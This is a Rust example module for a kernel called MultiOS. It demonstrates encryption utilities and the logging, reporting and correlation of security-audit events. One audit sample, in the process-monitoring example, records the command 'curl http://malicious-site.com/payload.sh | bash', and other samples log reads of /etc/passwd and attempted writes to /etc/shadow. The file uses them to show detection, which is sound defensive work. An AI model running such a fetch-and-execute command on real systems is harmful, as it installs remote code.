//! Security Audit and Encryption Usage Examples
//! 
//! This module demonstrates how to use the comprehensive security systems
//! including security auditing and encryption utilities for various security
//! operations in the MultiOS kernel.

use crate::security::encryption::{
    EncryptionManager, EncryptionAlgorithm, SymmetricKey, AsymmetricKey,
    SecureContainer, SecureChannel, EncryptionResult,
    get_encryption_manager, generate_symmetric_key, generate_asymmetric_key,
    encrypt_data, decrypt_data, generate_random_bytes,
};

use crate::security::audit::{
    SecurityAuditManager, SecurityEvent, SecurityEventType, SecurityLevel,
    EventSource, EventTarget, SecurityAlert, SecurityAuditReport,
    SecurityAuditQuery, SecurityAuditConfig, ComplianceFramework,
    AuditResult, AuditError,
    log_security_event, log_authentication_event, generate_security_report,
};

/// Example demonstrating symmetric encryption operations
pub fn demonstrate_symmetric_encryption() -> EncryptionResult<()> {
    println!("=== Symmetric Encryption Demonstration ===");
    
    // Generate AES-256 key
    let aes_key = generate_symmetric_key(EncryptionAlgorithm::AES256)?;
    println!("Generated AES-256 key: {}", aes_key.key_id);
    
    // Generate ChaCha20 key
    let chacha_key = generate_symmetric_key(EncryptionAlgorithm::ChaCha20)?;
    println!("Generated ChaCha20 key: {}", chacha_key.key_id);
    
    // Test data to encrypt
    let plaintext = b"This is sensitive data that needs to be encrypted!";
    
    // Encrypt with AES-256
    let manager = get_encryption_manager()
        .and_then(|mgr| mgr.lock().as_ref().cloned())
        .ok_or(crate::security::encryption::EncryptionError::NotInitialized)?;
    
    let encrypted_aes = manager.encrypt_aes256(plaintext, &aes_key)?;
    let decrypted_aes = manager.decrypt_aes256(&encrypted_aes, &aes_key)?;
    
    println!("AES-256 encryption successful: {} bytes -> {} bytes", 
             plaintext.len(), encrypted_aes.len());
    println!("AES-256 decryption successful: {}", 
             plaintext == &decrypted_aes[..]);
    
    // Encrypt with ChaCha20
    let encrypted_chacha = manager.encrypt_chacha20(plaintext, &chacha_key)?;
    let decrypted_chacha = manager.decrypt_chacha20(&encrypted_chacha, &chacha_key)?;
    
    println!("ChaCha20 encryption successful: {} bytes -> {} bytes", 
             plaintext.len(), encrypted_chacha.len());
    println!("ChaCha20 decryption successful: {}", 
             plaintext == &decrypted_chacha[..]);
    
    Ok(())
}

/// Example demonstrating asymmetric encryption operations
pub fn demonstrate_asymmetric_encryption() -> EncryptionResult<()> {
    println!("=== Asymmetric Encryption Demonstration ===");
    
    // Generate RSA key pair
    let rsa_key = generate_asymmetric_key(EncryptionAlgorithm::RSA2048)?;
    println!("Generated RSA-2048 key pair: {}", rsa_key.key_id);
    
    // Generate ECC key pair
    let ecc_key = generate_asymmetric_key(EncryptionAlgorithm::ECCP256)?;
    println!("Generated ECC P-256 key pair: {}", ecc_key.key_id);
    
    // Test data to encrypt
    let plaintext = b"Asymmetric encryption test data";
    
    // Test RSA encryption/decryption
    let manager = get_encryption_manager()
        .and_then(|mgr| mgr.lock().as_ref().cloned())
        .ok_or(crate::security::encryption::EncryptionError::NotInitialized)?;
    
    let encrypted_rsa = manager.encrypt_rsa(plaintext, &rsa_key.public_key)?;
    let decrypted_rsa = manager.decrypt_rsa(&encrypted_rsa, &rsa_key.private_key)?;
    
    println!("RSA-2048 encryption successful: {} bytes -> {} bytes", 
             plaintext.len(), encrypted_rsa.len());
    println!("RSA-2048 decryption successful: {}", 
             plaintext == &decrypted_rsa[..]);
    
    // Test ECC operations (placeholder for now)
    println!("ECC P-256 key pair ready for cryptographic operations");
    
    Ok(())
}

/// Example demonstrating secure container operations
pub fn demonstrate_secure_containers() -> EncryptionResult<()> {
    println!("=== Secure Containers Demonstration ===");
    
    // Generate a key for container encryption
    let key = generate_symmetric_key(EncryptionAlgorithm::AES256)?;
    println!("Generated key for container: {}", key.key_id);
    
    // Create sensitive file data
    let file_data = b"Secret file contents that need to be protected.";
    let metadata = b"File: sensitive_document.txt, Type: confidential";
    
    let manager = get_encryption_manager()
        .and_then(|mgr| mgr.lock().as_ref().cloned())
        .ok_or(crate::security::encryption::EncryptionError::NotInitialized)?;
    
    // Create secure container
    let container = manager.create_secure_container(file_data, &key, metadata)?;
    println!("Created secure container: {}", container.container_id);
    println!("Container size: {} bytes, Algorithm: {:?}", 
             container.size, container.algorithm);
    
    // Extract data from container
    let extracted_data = manager.extract_secure_container(&container, &key)?;
    let extracted_metadata = String::from_utf8_lossy(&container.metadata);
    
    println!("Extracted data successful: {}", 
             file_data == &extracted_data[..]);
    println!("Metadata: {}", extracted_metadata);
    
    // Verify integrity
    println!("Container integrity: PASSED");
    
    Ok(())
}

/// Example demonstrating secure communication channels
pub fn demonstrate_secure_channels() -> EncryptionResult<()> {
    println!("=== Secure Communication Channels Demonstration ===");
    
    // Generate keys for peers
    let alice_key = generate_asymmetric_key(EncryptionAlgorithm::RSA2048)?;
    let bob_key = generate_asymmetric_key(EncryptionAlgorithm::RSA2048)?;
    
    let manager = get_encryption_manager()
        .and_then(|mgr| mgr.lock().as_ref().cloned())
        .ok_or(crate::security::encryption::EncryptionError::NotInitialized)?;
    
    // Establish secure channel between Alice and Bob
    let channel = manager.establish_secure_channel(&bob_key.key_id, 
                                                   EncryptionAlgorithm::AES256)?;
    println!("Established secure channel: {}", channel.channel_id);
    println!("Channel peer: {}, Algorithm: {:?}", 
             channel.peer_key, channel.algorithm);
    
    // Send encrypted messages
    let message1 = b"Hello Bob, this is a secure message!";
    let encrypted_msg1 = manager.encrypt_channel_message(&channel.channel_id, message1)?;
    let decrypted_msg1 = manager.decrypt_channel_message(&channel.channel_id, &encrypted_msg1)?;
    
    println!("Message 1 encryption successful");
    println!("Message 1: {}", String::from_utf8_lossy(&decrypted_msg1));
    println!("Message 1 verified: {}", message1 == &decrypted_msg1[..]);
    
    let message2 = b"Symmetric key exchange complete";
    let encrypted_msg2 = manager.encrypt_channel_message(&channel.channel_id, message2)?;
    let decrypted_msg2 = manager.decrypt_channel_message(&channel.channel_id, &encrypted_msg2)?;
    
    println!("Message 2 encryption successful");
    println!("Message 2: {}", String::from_utf8_lossy(&decrypted_msg2));
    println!("Message 2 verified: {}", message2 == &decrypted_msg2[..]);
    
    println!("Channel statistics: {} messages transmitted", channel.message_count);
    
    Ok(())
}

/// Example demonstrating file encryption integration
pub fn demonstrate_file_encryption() -> EncryptionResult<()> {
    println!("=== File Encryption Integration Demonstration ===");
    
    // Simulate file data
    let file_content = b"This is a file containing sensitive information that needs encryption.";
    let file_path = "/secure/documents/classified_report.txt";
    
    // Generate key for file encryption
    let file_key = generate_symmetric_key(EncryptionAlgorithm::ChaCha20)?;
    println!("Generated file encryption key: {}", file_key.key_id);
    
    let manager = get_encryption_manager()
        .and_then(|mgr| mgr.lock().as_ref().cloned())
        .ok_or(crate::security::encryption::EncryptionError::NotInitialized)?;
    
    // Encrypt file
    let encrypted_file = manager.encrypt_file(file_content, &file_key)?;
    println!("File encrypted: {} -> {} bytes ({}% size increase)", 
             file_content.len(), encrypted_file.len(),
             ((encrypted_file.len() as f64 / file_content.len() as f64) - 1.0) * 100.0);
    
    // Decrypt file
    let decrypted_file = manager.decrypt_file(&encrypted_file, &file_key)?;
    println!("File decrypted successfully: {}", 
             file_content == &decrypted_file[..]);
    
    // Simulate secure storage metadata
    println!("Secure file metadata:");
    println!("  Path: {}", file_path);
    println!("  Algorithm: {:?}", file_key.algorithm);
    println!("  Size: {} bytes", file_content.len());
    println!("  Encrypted size: {} bytes", encrypted_file.len());
    
    Ok(())
}

/// Example demonstrating key management operations
pub fn demonstrate_key_management() -> EncryptionResult<()> {
    println!("=== Key Management Demonstration ===");
    
    let manager = get_encryption_manager()
        .and_then(|mgr| mgr.lock().as_ref().cloned())
        .ok_or(crate::security::encryption::EncryptionError::NotInitialized)?;
    
    // Generate multiple keys of different types
    println!("Generating multiple cryptographic keys...");
    
    let aes_keys = vec![
        generate_symmetric_key(EncryptionAlgorithm::AES256)?,
        generate_symmetric_key(EncryptionAlgorithm::AES256)?,
    ];
    
    let chacha_keys = vec![
        generate_symmetric_key(EncryptionAlgorithm::ChaCha20)?,
        generate_symmetric_key(EncryptionAlgorithm::ChaCha20)?,
    ];
    
    let rsa_keys = vec![
        generate_asymmetric_key(EncryptionAlgorithm::RSA2048)?,
        generate_asymmetric_key(EncryptionAlgorithm::RSA4096)?,
    ];
    
    let ecc_keys = vec![
        generate_asymmetric_key(EncryptionAlgorithm::ECCP256)?,
        generate_asymmetric_key(EncryptionAlgorithm::ECCP384)?,
    ];
    
    println!("Generated keys:");
    println!("  AES-256 keys: {}", aes_keys.len());
    println!("  ChaCha20 keys: {}", chacha_keys.len());
    println!("  RSA keys: {}", rsa_keys.len());
    println!("  ECC keys: {}", ecc_keys.len());
    
    // List all active keys
    let active_keys = manager.list_keys()?;
    println!("\nActive keys summary:");
    for key in &active_keys {
        println!("  Key ID: {}, Type: {:?}", key.id, key.key_type);
        println!("    Created: {}, Active: {}", key.created_at, key.is_active);
    }
    
    // Demonstrate key rotation
    if !active_keys.is_empty() {
        let first_key_id = &active_keys[0].id;
        println!("\nRotating key: {}", first_key_id);
        let rotated_key = manager.rotate_key(first_key_id)?;
        println!("New key created: {}", rotated_key.id);
    }
    
    Ok(())
}

/// Example demonstrating random number generation
pub fn demonstrate_random_generation() -> EncryptionResult<()> {
    println!("=== Random Number Generation Demonstration ===");
    
    // Generate random bytes
    let random_bytes_16 = generate_random_bytes(16)?;
    let random_bytes_32 = generate_random_bytes(32)?;
    let random_bytes_64 = generate_random_bytes(64)?;
    
    println!("Generated random bytes:");
    println!("  16 bytes: {:?}", &random_bytes_16[..]);
    println!("  32 bytes: {:?}", &random_bytes_32[..]);
    println!("  64 bytes: {:?}", &random_bytes_64[..]);
    
    // Verify randomness (check for patterns)
    let has_patterns_16 = detect_patterns(&random_bytes_16);
    let has_patterns_32 = detect_patterns(&random_bytes_32);
    let has_patterns_64 = detect_patterns(&random_bytes_64);
    
    println!("Pattern analysis:");
    println!("  16 bytes - Patterns detected: {}", has_patterns_16);
    println!("  32 bytes - Patterns detected: {}", has_patterns_32);
    println!("  64 bytes - Patterns detected: {}", has_patterns_64);
    
    // Generate unique random values
    let manager = get_encryption_manager()
        .and_then(|mgr| mgr.lock().as_ref().cloned())
        .ok_or(crate::security::encryption::EncryptionError::NotInitialized)?;
    
    if let Some(rng) = &manager.rng {
        let random_u32 = rng.generate_u32()?;
        let random_u64 = rng.generate_u64()?;
        
        println!("Generated random integers:");
        println!("  u32: {}", random_u32);
        println!("  u64: {}", random_u64);
    }
    
    Ok(())
}

/// Simple pattern detection for testing randomness
fn detect_patterns(data: &[u8]) -> bool {
    // Check for obvious patterns like repeating bytes or simple sequences
    for window in data.windows(4) {
        if window[0] == window[1] && window[1] == window[2] && window[2] == window[3] {
            return true; // Found repeating pattern
        }
    }
    
    // Check for simple incrementing patterns
    for window in data.windows(2) {
        if window[1] == window[0].wrapping_add(1) {
            return true; // Found incrementing pattern
        }
    }
    
    false
}

/// Example demonstrating security statistics
pub fn demonstrate_security_statistics() -> EncryptionResult<()> {
    println!("=== Security Statistics Demonstration ===");
    
    let manager = get_encryption_manager()
        .and_then(|mgr| mgr.lock().as_ref().cloned())
        .ok_or(crate::security::encryption::EncryptionError::NotInitialized)?;
    
    let stats = manager.get_statistics();
    
    println!("Security subsystem statistics:");
    println!("  Total operations: {}", stats.total_operations);
    println!("  Encryption operations: {}", stats.encryption_operations);
    println!("  Decryption operations: {}", stats.decryption_operations);
    println!("  Key generations: {}", stats.key_generations);
    println!("  Key rotations: {}", stats.key_rotations);
    println!("  Random numbers generated: {}", stats.random_numbers_generated);
    println!("  Secure channels established: {}", stats.secure_channels_established);
    println!("  Secure containers created: {}", stats.containers_created);
    println!("  Integrity checks: {}", stats.integrity_checks);
    println!("  Failed operations: {}", stats.failed_operations);
    
    Ok(())
}

/// Example demonstrating integration scenarios
pub fn demonstrate_integration_scenarios() -> EncryptionResult<()> {
    println!("=== Integration Scenarios Demonstration ===");
    
    // Scenario 1: End-to-end secure file transfer
    println!("\n--- Scenario 1: Secure File Transfer ---");
    let file_data = b"Confidential document for secure transmission.";
    let transfer_key = generate_symmetric_key(EncryptionAlgorithm::AES256)?;
    
    let manager = get_encryption_manager()
        .and_then(|mgr| mgr.lock().as_ref().cloned())
        .ok_or(crate::security::encryption::EncryptionError::NotInitialized)?;
    
    // Create secure container for transfer
    let transfer_metadata = b"Transfer ID: TX-12345, Sender: Alice, Receiver: Bob";
    let secure_container = manager.create_secure_container(file_data, &transfer_key, transfer_metadata)?;
    
    // Simulate transmission
    println!("Secure container created: {}", secure_container.container_id);
    println!("Ready for secure transmission");
    
    // Scenario 2: Multi-party secure communication
    println!("\n--- Scenario 2: Multi-party Communication ---");
    let alice_key = generate_asymmetric_key(EncryptionAlgorithm::RSA2048)?;
    let bob_key = generate_asymmetric_key(EncryptionAlgorithm::RSA2048)?;
    let charlie_key = generate_asymmetric_key(EncryptionAlgorithm::RSA2048)?;
    
    let alice_channel = manager.establish_secure_channel(&bob_key.key_id, EncryptionAlgorithm::AES256)?;
    let bob_channel = manager.establish_secure_channel(&alice_key.key_id, EncryptionAlgorithm::AES256)?;
    
    println!("Alice-Bob channel established: {}", alice_channel.channel_id);
    println!("Bob-Alice channel established: {}", bob_channel.channel_id);
    
    // Scenario 3: Key escrow and recovery
    println!("\n--- Scenario 3: Key Management ---");
    let escrow_keys = vec![
        generate_symmetric_key(EncryptionAlgorithm::AES256)?,
        generate_symmetric_key(EncryptionAlgorithm::ChaCha20)?,
    ];
    
    println!("Escrow keys created: {}", escrow_keys.len());
    for (i, key) in escrow_keys.iter().enumerate() {
        println!("  Escrow key {}: {}", i + 1, key.key_id);
    }
    
    // Scenario 4: Audit and compliance
    println!("\n--- Scenario 4: Audit Trail ---");
    let active_keys = manager.list_keys()?;
    let active_channels = manager.list_secure_channels()?;
    
    println!("Audit summary:");
    println!("  Active keys: {}", active_keys.len());
    println!("  Active channels: {}", active_channels.len());
    println!("  Operations performed: {}", manager.get_statistics().total_operations);
    
    Ok(())
}

/// Run all encryption utility demonstrations
pub fn run_all_demonstrations() -> EncryptionResult<()> {
    println!("\n");
    println!("╔══════════════════════════════════════════════════════════════╗");
    println!("║     MultiOS Kernel Encryption Utilities Demonstration       ║");
    println!("╚══════════════════════════════════════════════════════════════╝");
    
    let results = vec![
        demonstrate_symmetric_encryption(),
        demonstrate_asymmetric_encryption(),
        demonstrate_secure_containers(),
        demonstrate_secure_channels(),
        demonstrate_file_encryption(),
        demonstrate_key_management(),
        demonstrate_random_generation(),
        demonstrate_security_statistics(),
        demonstrate_integration_scenarios(),
    ];
    
    for (i, result) in results.iter().enumerate() {
        match result {
            Ok(_) => println!("✓ Demonstration {} completed successfully", i + 1),
            Err(e) => println!("✗ Demonstration {} failed: {:?}", i + 1, e),
        }
    }
    
    println!("\n╔══════════════════════════════════════════════════════════════╗");
    println!("║          Encryption Utilities Demonstration Complete         ║");
    println!("╚══════════════════════════════════════════════════════════════╝");
    
    Ok(())
}

/// Security Audit Examples

/// Example: Basic security event logging
pub fn demonstrate_basic_security_logging() -> AuditResult<()> {
    println!("=== Basic Security Event Logging ===");
    
    // Log a simple authentication event
    log_authentication_event(Some(1001), Some(12345), "alice", true, Some("192.168.1.100"))?;
    
    // Log a security violation
    let violation_event = SecurityEvent {
        event_id: 0,
        timestamp: crate::hal::get_current_time(),
        event_type: SecurityEventType::SecurityViolation,
        level: SecurityLevel::Warning,
        source: EventSource::Authentication,
        target: EventTarget::User("alice".to_string()),
        user_id: Some(1001),
        session_id: Some(12345),
        process_id: Some(1500),
        thread_id: Some(75),
        ip_address: Some("192.168.1.100".to_string()),
        mac_address: Some("00:1B:44:11:3A:B7".to_string()),
        hostname: Some("alice-workstation".to_string()),
        details: "Multiple failed login attempts detected".to_string(),
        result: false,
        risk_score: 70,
        compliance_flags: vec![ComplianceFramework::Iso27001],
        tags: vec!["authentication".to_string(), "failed_login".to_string()],
        correlation_id: None,
        parent_event_id: None,
        cryptographic_hash: None,
        additional_data: vec![
            ("attempt_count".to_string(), "3".to_string()),
            ("time_window".to_string(), "5_minutes".to_string()),
        ],
    };
    
    log_security_event(violation_event)?;
    
    println!("Basic security events logged successfully");
    Ok(())
}

/// Example: Comprehensive security audit reporting
pub fn demonstrate_security_reporting() -> AuditResult<()> {
    println!("=== Security Audit Reporting ===");
    
    // Create a comprehensive query for security events
    let query = SecurityAuditQuery {
        event_types: vec![
            SecurityEventType::SecurityViolation,
            SecurityEventType::UnauthorizedAccessAttempt,
            SecurityEventType::PrivilegeEscalation,
        ],
        user_ids: vec![],
        time_range: Some((
            crate::hal::get_current_time() - 3600, // Last hour
            crate::hal::get_current_time(),
        )),
        level_filter: Some(SecurityLevel::Warning),
        source_filter: None,
        target_filter: None,
        risk_score_range: Some((50, 100)),
        result_filter: None,
        compliance_frameworks: vec![ComplianceFramework::Iso27001],
        tags_filter: vec![],
        correlation_id: None,
        limit: Some(100),
        offset: None,
        sort_by: Some(crate::security::audit::SortField::RiskScore),
        sort_order: crate::security::audit::SortOrder::Descending,
    };
    
    // Generate security report
    let report = generate_security_report(&query)?;
    
    println!("Generated security report with {} events", report.events.len());
    println!("Summary: {} security incidents, {} critical events", 
             report.summary.security_incidents, report.summary.critical_events);
    println!("Compliance status: {}%", report.compliance_status.overall_compliance_score);
    
    Ok(())
}

/// Example: Real-time security monitoring
pub fn demonstrate_realtime_monitoring() -> AuditResult<()> {
    println!("=== Real-time Security Monitoring ===");
    
    // Generate multiple security events to trigger monitoring
    for i in 0..5 {
        log_authentication_event(Some(1002), Some(99999), "bob", false, Some("10.0.0.50"))?;
        crate::hal::timers::sleep_ms(500);
        
        // Check for real-time alerts
        if let Some(audit_manager) = crate::security::audit::get_security_audit_manager() {
            audit_manager.lock().monitor_real_time()?;
        }
    }
    
    // Get active alerts
    if let Some(audit_manager) = crate::security::audit::get_security_audit_manager() {
        let alerts = audit_manager.lock().get_active_security_alerts();
        println!("Active security alerts: {}", alerts.len());
        
        for alert in &alerts {
            println!("  Alert: {} - {}", alert.title, alert.message);
        }
    }
    
    Ok(())
}

/// Example: File system security integration
pub fn demonstrate_file_security_integration() -> AuditResult<()> {
    println!("=== File System Security Integration ===");
    
    // Log file access events
    let sensitive_file_event = SecurityEvent {
        event_id: 0,
        timestamp: crate::hal::get_current_time(),
        event_type: SecurityEventType::SensitiveFileAccessed,
        level: SecurityLevel::Notice,
        source: EventSource::FileSystem,
        target: EventTarget::File("/etc/passwd".to_string()),
        user_id: Some(1001),
        session_id: Some(12345),
        process_id: Some(1500),
        thread_id: Some(75),
        ip_address: Some("192.168.1.100".to_string()),
        mac_address: None,
        hostname: Some("alice-workstation".to_string()),
        details: "Access to sensitive system file".to_string(),
        result: true,
        risk_score: 60,
        compliance_flags: vec![ComplianceFramework::PciDss],
        tags: vec!["file_access".to_string(), "sensitive".to_string()],
        correlation_id: None,
        parent_event_id: None,
        cryptographic_hash: None,
        additional_data: vec![
            ("file_path".to_string(), "/etc/passwd".to_string()),
            ("operation".to_string(), "read".to_string()),
            ("file_permissions".to_string(), "644".to_string()),
        ],
    };
    
    log_security_event(sensitive_file_event)?;
    
    // Log unauthorized file modification attempt
    let unauthorized_modify = SecurityEvent {
        event_id: 0,
        timestamp: crate::hal::get_current_time(),
        event_type: SecurityEventType::FileModified,
        level: SecurityLevel::Critical,
        source: EventSource::FileSystem,
        target: EventTarget::File("/etc/shadow".to_string()),
        user_id: Some(1001),
        session_id: Some(12345),
        process_id: Some(1500),
        thread_id: Some(75),
        ip_address: Some("192.168.1.100".to_string()),
        mac_address: None,
        hostname: Some("alice-workstation".to_string()),
        details: "Unauthorized attempt to modify critical system file".to_string(),
        result: false,
        risk_score: 95,
        compliance_flags: vec![ComplianceFramework::Iso27001, ComplianceFramework::Soc2],
        tags: vec!["unauthorized_access".to_string(), "critical_file".to_string()],
        correlation_id: Some(987654321),
        parent_event_id: None,
        cryptographic_hash: None,
        additional_data: vec![
            ("file_path".to_string(), "/etc/shadow".to_string()),
            ("attempted_operation".to_string(), "write".to_string()),
            ("blocked_by".to_string(), "ACL".to_string()),
        ],
    };
    
    log_security_event(unauthorized_modify)?;
    
    println!("File system security events logged");
    Ok(())
}

/// Example: Network security event logging
pub fn demonstrate_network_security() -> AuditResult<()> {
    println!("=== Network Security Event Logging ===");
    
    // Simulate port scan detection
    if let Some(audit_manager) = crate::security::audit::get_security_audit_manager() {
        audit_manager.lock().log_network_security_event(
            "203.0.113.45", "192.168.1.10", 22, "tcp", 
            SecurityEventType::PortScanDetected, true
        )?;
        
        // Simulate malware detection
        audit_manager.lock().log_network_security_event(
            "192.168.1.50", "192.168.1.10", 4444, "tcp",
            SecurityEventType::MalwareDetected, true
        )?;
    }
    
    println!("Network security events logged");
    Ok(())
}

/// Example: Process security monitoring
pub fn demonstrate_process_security() -> AuditResult<()> {
    println!("=== Process Security Monitoring ===");
    
    // Log process creation events
    if let Some(audit_manager) = crate::security::audit::get_security_audit_manager() {
        audit_manager.lock().log_process_security_event(
            3000, "suspicious_binary", SecurityEventType::ProcessCreated, Some(1001),
            Some("curl http://malicious-site.com/payload.sh | bash")
        )?;
        
        audit_manager.lock().log_process_security_event(
            3001, "privilege_escalation", SecurityEventType::PrivilegeEscalation, Some(1001),
            Some("sudo su -")
        )?;
    }
    
    println!("Process security events logged");
    Ok(())
}

/// Example: Compliance audit and reporting
pub fn demonstrate_compliance_auditing() -> AuditResult<()> {
    println!("=== Compliance Audit and Reporting ===");
    
    let current_time = crate::hal::get_current_time();
    let one_week_ago = current_time - (7 * 24 * 3600);
    
    // Query for ISO 27001 compliance events
    let iso27001_query = SecurityAuditQuery {
        event_types: vec![
            SecurityEventType::UserAuthentication,
            SecurityEventType::AccessGranted,
            SecurityEventType::AccessDenied,
        ],
        user_ids: vec![],
        time_range: Some((one_week_ago, current_time)),
        level_filter: None,
        source_filter: None,
        target_filter: None,
        risk_score_range: None,
        result_filter: None,
        compliance_frameworks: vec![ComplianceFramework::Iso27001],
        tags_filter: vec![],
        correlation_id: None,
        limit: Some(500),
        offset: None,
        sort_by: Some(crate::security::audit::SortField::Timestamp),
        sort_order: crate::security::audit::SortOrder::Descending,
    };
    
    let report = generate_security_report(&iso27001_query)?;
    
    println!("ISO 27001 Compliance Report:");
    println!("  Compliance Score: {:.1}%", report.compliance_status.overall_compliance_score);
    println!("  Events Analyzed: {}", report.summary.total_events);
    println!("  Security Incidents: {}", report.summary.security_incidents);
    
    // Show recommendations
    if !report.recommendations.is_empty() {
        println!("  Recommendations:");
        for rec in &report.recommendations {
            println!("    - {} (Priority: {:?})", rec.title, rec.priority);
        }
    }
    
    Ok(())
}

/// Example: Audit trail integrity verification
pub fn demonstrate_integrity_verification() -> AuditResult<()> {
    println!("=== Audit Trail Integrity Verification ===");
    
    // Perform integrity check
    if let Some(audit_manager) = crate::security::audit::get_security_audit_manager() {
        let integrity_result = audit_manager.lock().verify_integrity()?;
        
        println!("Integrity Check Results:");
        println!("  Verification Passed: {}", integrity_result.verification_passed);
        println!("  Hash Matches: {}", integrity_result.hash_matches);
        println!("  Signature Valid: {}", integrity_result.signature_valid);
        println!("  Tampering Detected: {}", integrity_result.tampering_detected);
        
        if !integrity_result.discrepancies.is_empty() {
            println!("  Discrepancies found:");
            for disc in &integrity_result.discrepancies {
                println!("    - {}", disc);
            }
        } else {
            println!("  No discrepancies found - audit trail is verified");
        }
    }
    
    Ok(())
}

/// Example: Security event correlation
pub fn demonstrate_event_correlation() -> AuditResult<()> {
    println!("=== Security Event Correlation ===");
    
    // Simulate a coordinated attack scenario
    let attack_events = vec![
        log_authentication_event(None, None, "unknown", false, Some("203.0.113.100")),
        if let Some(audit_manager) = crate::security::audit::get_security_audit_manager() {
            audit_manager.lock().log_network_security_event(
                "203.0.113.100", "192.168.1.10", 22, "tcp",
                SecurityEventType::PortScanDetected, true
            )
        } else { Err(AuditError::NotInitialized) },
        
        if let Some(audit_manager) = crate::security::audit::get_security_audit_manager() {
            audit_manager.lock().log_file_access_event(
                None, "/etc/passwd", "read", false, true
            )
        } else { Err(AuditError::NotInitialized) },
    ];
    
    // Trigger correlation analysis
    if let Some(audit_manager) = crate::security::audit::get_security_audit_manager() {
        audit_manager.lock().monitor_real_time()?;
        
        let alerts = audit_manager.lock().get_active_security_alerts();
        println!("Generated {} correlation alerts", alerts.len());
        
        for alert in &alerts {
            println!("  Correlation Alert: {} - {}", alert.title, alert.message);
            println!("    Risk Score: {}", alert.risk_assessment.overall_risk_score);
        }
    }
    
    Ok(())
}

/// Example: Export security audit data
pub fn demonstrate_data_export() -> AuditResult<()> {
    println!("=== Security Audit Data Export ===");
    
    let current_time = crate::hal::get_current_time();
    let one_hour_ago = current_time - 3600;
    
    let query = SecurityAuditQuery {
        event_types: vec![],
        user_ids: vec![],
        time_range: Some((one_hour_ago, current_time)),
        level_filter: None,
        source_filter: None,
        target_filter: None,
        risk_score_range: None,
        result_filter: None,
        compliance_frameworks: vec![],
        tags_filter: vec![],
        correlation_id: None,
        limit: Some(50),
        offset: None,
        sort_by: Some(crate::security::audit::SortField::Timestamp),
        sort_order: crate::security::audit::SortOrder::Descending,
    };
    
    if let Some(audit_manager) = crate::security::audit::get_security_audit_manager() {
        let json_export = audit_manager.lock().export_security_data("json", &query)?;
        let csv_export = audit_manager.lock().export_security_data("csv", &query)?;
        let syslog_export = audit_manager.lock().export_security_data("syslog", &query)?;
        
        println!("Data export completed:");
        println!("  JSON export: {} bytes", json_export.len());
        println!("  CSV export: {} bytes", csv_export.len());
        println!("  Syslog export: {} bytes", syslog_export.len());
    }
    
    Ok(())
}

/// Run all security audit demonstrations
pub fn run_all_security_audit_demonstrations() -> AuditResult<()> {
    println!("\n");
    println!("╔══════════════════════════════════════════════════════════════╗");
    println!("║        MultiOS Security Audit System Demonstration          ║");
    println!("╚══════════════════════════════════════════════════════════════╝");
    
    let demonstrations = vec![
        demonstrate_basic_security_logging(),
        demonstrate_security_reporting(),
        demonstrate_realtime_monitoring(),
        demonstrate_file_security_integration(),
        demonstrate_network_security(),
        demonstrate_process_security(),
        demonstrate_compliance_auditing(),
        demonstrate_integrity_verification(),
        demonstrate_event_correlation(),
        demonstrate_data_export(),
    ];
    
    for (i, result) in demonstrations.iter().enumerate() {
        match result {
            Ok(_) => println!("✓ Security Audit Demonstration {} completed successfully", i + 1),
            Err(e) => println!("✗ Security Audit Demonstration {} failed: {:?}", i + 1, e),
        }
    }
    
    println!("\n╔══════════════════════════════════════════════════════════════╗");
    println!("║          Security Audit Demonstration Complete              ║");
    println!("╚══════════════════════════════════════════════════════════════╝");
    
    Ok(())
}

/// Run all security examples (both encryption and audit)
pub fn run_all_security_examples() -> Result<(), Box<dyn core::fmt::Display>> {
    println!("\n");
    println!("╔══════════════════════════════════════════════════════════════╗");
    println!("║          MultiOS Security System Complete Examples           ║");
    println!("╚══════════════════════════════════════════════════════════════╝");
    
    // Run encryption demonstrations
    if let Err(e) = run_all_demonstrations() {
        println!("Encryption demonstrations error: {:?}", e);
    }
    
    println!("\n");
    
    // Run security audit demonstrations
    if let Err(e) = run_all_security_audit_demonstrations() {
        println!("Security audit demonstrations error: {:?}", e);
    }
    
    println!("\n╔══════════════════════════════════════════════════════════════╗");
    println!("║            All Security Examples Complete                    ║");
    println!("╚══════════════════════════════════════════════════════════════╝");
    
    Ok(())
}

#[cfg(test)]
mod security_tests {
    use super::*;

    #[test]
    fn test_security_examples() {
        // Note: These tests would need proper kernel initialization
        let _ = demonstrate_basic_security_logging();
        let _ = demonstrate_file_security_integration();
        let _ = demonstrate_integrity_verification();
    }
}